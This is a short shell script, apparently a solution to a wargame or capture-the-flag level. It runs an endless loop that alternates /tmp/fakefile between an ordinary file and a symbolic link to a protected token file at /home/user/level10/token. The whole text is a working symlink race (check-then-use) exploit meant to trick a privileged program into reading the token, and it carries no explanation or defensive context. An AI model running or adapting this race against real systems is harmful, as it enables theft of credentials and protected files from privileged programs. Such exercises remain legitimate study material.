while true;
do
touch /tmp/fakefile
rm /tmp/fakefile
ln -s /home/user/level10/token /tmp/fakefile
rm /tmp/fakefile
done
